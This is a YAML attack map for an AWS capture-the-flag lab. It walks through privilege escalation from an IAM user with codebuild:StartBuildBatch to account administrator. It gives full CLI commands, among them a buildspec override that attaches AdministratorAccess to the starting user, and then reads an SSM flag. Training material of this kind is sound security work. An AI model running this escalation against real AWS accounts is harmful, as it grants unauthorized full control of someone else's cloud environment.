attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-codebuild-003-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has codebuild:StartBuildBatch permission (along with
        codebuild:ListProjects, codebuild:BatchGetProjects, and
        codebuild:BatchGetBuildBatches) and can trigger builds against an existing
        CodeBuild project that has a privileged service role attached.

    - id: codebuild-project
      label: "Target CodeBuild Project"
      type: resource
      subType: codebuild-project
      arn: "arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-003-to-admin-target-project"
      description: >
        An existing CodeBuild project configured to support batch builds. It has the
        target service role attached, which grants it iam:AttachUserPolicy. Because
        StartBuildBatch accepts a buildspec override, any principal with
        codebuild:StartBuildBatch can inject arbitrary commands that execute under
        this project's privileged role — no iam:PassRole or codebuild:CreateProject
        required.

    - id: target-role
      label: "Target Service Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-codebuild-003-to-admin-target-role"
      description: >
        The CodeBuild service role attached to the target project. It has
        iam:AttachUserPolicy permission, allowing it to attach any managed policy —
        including AdministratorAccess — to any IAM user. Commands injected via
        buildspec override execute under the context of this role. Gaining the
        ability to act as this role completes the privilege escalation — the
        injected buildspec attaches AdministratorAccess to the starting user,
        granting full administrative control over the AWS account — and
        admin-equivalent permissions that are then used to read the scenario's
        CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/codebuild-003-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: codebuild-project
      label: "codebuild:StartBuildBatch"
      description: >
        Trigger a batch build on the existing project using --buildspec-override
        to inject a malicious buildspec that will execute under the project's
        privileged service role.
      hints:
        - "Use your helpful permissions to enumerate CodeBuild projects in the account and identify which ones exist."
        - "Once you have a project name, use codebuild:BatchGetProjects to inspect the project details -- pay close attention to the serviceRole field."
        - "Consider what the project's service role is allowed to do. A role with IAM modification permissions is your target."
        - "CodeBuild allows callers to override the buildspec at invocation time using --buildspec-override. Think about what code you could run using the project's role."
        - "The buildspec override for a batch build must use the batch format (with a top-level 'batch:' key and a 'build-list'). Write your malicious commands in the nested buildspec's phases.build.commands section."
        - "Your injected commands will run as the project's service role -- use that to make an IAM change that grants your starting user elevated permissions."
        - "Browse to https://pathfinding.cloud/paths/codebuild-003 for technique details."
      commands:
        - description: "List available CodeBuild projects"
          command: "aws codebuild list-projects"
        - description: "Inspect the project's service role"
          command: "aws codebuild batch-get-projects --names pl-prod-codebuild-003-to-admin-target-project"
        - description: "Start a batch build with a malicious buildspec override that attaches AdministratorAccess to the starting user"
          command: |
            aws codebuild start-build-batch \
              --project-name pl-prod-codebuild-003-to-admin-target-project \
              --buildspec-override 'version: 0.2
            batch:
              fast-fail: false
              build-list:
                - identifier: escalate
                  env:
                    type: LINUX_CONTAINER
                    image: aws/codebuild/standard:7.0
                    compute-type: BUILD_GENERAL1_SMALL
            phases:
              build:
                commands:
                  - aws iam attach-user-policy --user-name pl-prod-codebuild-003-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
        - description: "Monitor the batch build until it completes"
          command: "aws codebuild batch-get-build-batches --ids <batch-build-id>"

    - from: codebuild-project
      to: target-role
      label: "iam:AttachUserPolicy (via buildspec)"
      description: >
        CodeBuild assumes the attached service role when executing the build,
        granting the injected buildspec commands the permissions of that role.
        The malicious buildspec runs as the service role and attaches the
        AdministratorAccess managed policy to the starting user, completing the
        privilege escalation.
      hints:
        - "Wait for the build batch status to reach SUCCEEDED before verifying the outcome -- batch orchestration takes 2-3 minutes."
        - "Use codebuild:BatchGetBuildBatches with the batch build ID to poll the buildBatchStatus field."
        - "After the build succeeds, allow 15 seconds for IAM policy changes to propagate before testing access."
        - "Verify the escalation by attempting an operation that requires admin access, such as listing IAM users."
      commands:
        - description: "Verify admin access after the build completes"
          command: "aws iam list-users --max-items 1"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/codebuild-003-to-admin --query 'Parameter.Value' --output text"
